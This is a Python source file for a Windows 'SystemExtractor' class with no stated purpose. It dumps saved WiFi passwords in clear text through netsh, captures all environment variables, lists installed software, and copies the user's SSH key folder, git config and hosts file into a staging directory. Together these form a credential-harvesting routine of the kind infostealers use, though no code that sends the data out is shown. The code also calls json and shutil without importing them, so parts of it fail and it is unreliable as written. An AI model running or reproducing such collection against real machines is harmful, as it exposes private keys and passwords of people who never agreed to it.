import subprocess
import re
import os

class SystemExtractor:
    def extract_wifi_passwords(self):
        results = []
        try:
            # Get profiles
            meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
            # Look for lines like "    ... : ProfileName"
            profiles = []
            for line in meta_data.split('\n'):
                if ":" in line:
                    profile_name = line.split(":")[1].strip()
                    if profile_name:
                        profiles.append(profile_name)

            for profile in profiles:
                try:
                    # Get password for each profile
                    results_pass = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace")
                    
                    password = None
                    for line in results_pass.split('\n'):
                        if ":" in line and ("Key Content" in line or "Contenuto chiave" in line):
                            password = line.split(":")[1].strip()
                            break
                    
                    results.append({
                        "ssid": profile,
                        "password": password
                    })
                except:
                    continue
        except Exception as e:
            print(f"Error extracting WiFi: {e}")
            
        return results

    def extract_env_vars(self):
        return dict(os.environ)

    def extract_installed_apps(self):
        # Using powershell to list apps
        apps = []
        try:
            cmd = 'powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | ConvertTo-Json"'
            output = subprocess.check_output(cmd).decode('utf-8', errors="ignore")
            data = json.loads(output)
            if isinstance(data, list):
                for item in data:
                    if item.get("DisplayName"):
                        apps.append({"name": item["DisplayName"], "version": item.get("DisplayVersion", "N/A")})
            elif isinstance(data, dict):
                 apps.append({"name": data["DisplayName"], "version": data.get("DisplayVersion", "N/A")})
        except:
            return [{"name": "Could not retrieve apps", "version": ""}]
        return apps

    def extract_ssh_keys(self, dest_dir):
        ssh_path = os.path.expandvars(r"%USERPROFILE%\.ssh")
        if os.path.exists(ssh_path):
            target = os.path.join(dest_dir, "developer", "ssh")
            os.makedirs(target, exist_ok=True)
            for item in os.listdir(ssh_path):
                s = os.path.join(ssh_path, item)
                d = os.path.join(target, item)
                if os.path.isfile(s):
                    shutil.copy2(s, d)
            return True
        return False

    def extract_git_config(self, dest_dir):
        git_config = os.path.expandvars(r"%USERPROFILE%\.gitconfig")
        if os.path.exists(git_config):
            target = os.path.join(dest_dir, "developer")
            os.makedirs(target, exist_ok=True)
            shutil.copy2(git_config, os.path.join(target, ".gitconfig"))
            return True
        return False

    def extract_hosts_file(self, dest_dir):
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        if os.path.exists(hosts_path):
            target = os.path.join(dest_dir, "system")
            os.makedirs(target, exist_ok=True)
            shutil.copy2(hosts_path, os.path.join(target, "hosts"))
            return True
        return False

    def extract_vscode_extensions(self):
        try:
            output = subprocess.check_output(['code', '--list-extensions']).decode('utf-8')
            return output.splitlines()
        except:
            return ["VS Code not found or 'code' command not in PATH"]
